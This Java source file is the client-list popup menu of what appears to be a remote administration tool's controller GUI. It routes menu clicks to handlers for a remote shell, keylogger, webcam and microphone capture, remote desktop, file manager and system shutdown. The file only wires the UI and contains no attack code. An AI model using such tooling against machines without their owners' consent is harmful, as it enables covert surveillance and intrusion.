package com.melardev.xeytanj.gui.main;

import com.melardev.xeytanj.enums.NetworkProtocol;
import com.melardev.xeytanj.enums.ProcessInfoDetails;
import com.melardev.xeytanj.errors.UnexpextedStateException;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.UUID;

public class ClientPopupMenu implements ActionListener {


    private final MainGui mainGui;

    public ClientPopupMenu(MainGui mainGui) {
        this.mainGui = mainGui;
    }

    @Override
    public void actionPerformed(ActionEvent paramActionEvent) {
        //TODO:change new thread by Runnable r = () -> { };
        Object source = paramActionEvent.getSource();
        JTable tableClients = mainGui.getTableClients();
        int row = tableClients.getSelectedRow();

        UUID id = null;
        if (row != -1)
            id = (UUID) (tableClients.getModel().getValueAt(row, tableClients.getColumnCount()));
        if (id == null)
            throw new UnexpextedStateException();

        if (source == mainGui.menuInfo) {
            mainGui.onShowClientInfo(id);
        } else if (source == mainGui.menuRemoteShell) {
            mainGui.onRemoteShellClicked(id);
        } else if (source == mainGui.menuListProcess)
            mainGui.onProcessListClicked(ProcessInfoDetails.BASIC, id);
        else if (source == mainGui.menuCamera)
            mainGui.onMenuCameraClicked(NetworkProtocol.TCP, id);
        else if (source == mainGui.menuDesktop)
            mainGui.onRemoteDesktopClicked(id);
        else if (source == mainGui.menuFileManager)
            mainGui.onRemoteFileManagerClicked(id);
        else if (source == mainGui.menuChat) {
            mainGui.onStartChatClicked(id);
        } else if (source == mainGui.mntmFile)
            mainGui.onVoIpClicked(id);
        else if (source == mainGui.mntmRaw)
            mainGui.onVoIpRawClicked(id);
        else if (source == mainGui.menuKeylogs)
            mainGui.onSessionKeyloggerClicked(id);
        else if (source == mainGui.menuLockSystem)
            mainGui.onLockSystemClicked(id);
        else if (source == mainGui.menuLogOff)
            mainGui.onLogOffSystem(id);
        else if (source == mainGui.menuShutdown)
            mainGui.onShutdownClicked(id);
        else if (source == mainGui.menuReboot)
            mainGui.onRebootClicked(id);
        else if (source == mainGui.menuTurnOnDisplay)
            mainGui.onTurnOnOffDisplayClicked(id, true);
        else if (source == mainGui.menuTurnOffDisplay)
            mainGui.onTurnOnOffDisplayClicked(id, false);
        else if(source == mainGui.menuCloseConnection)
            mainGui.onCloseConnectionClicked(id);
        else if(source == mainGui.menuUninstallServer)
            mainGui.onUninstallServer(id);
    }
}
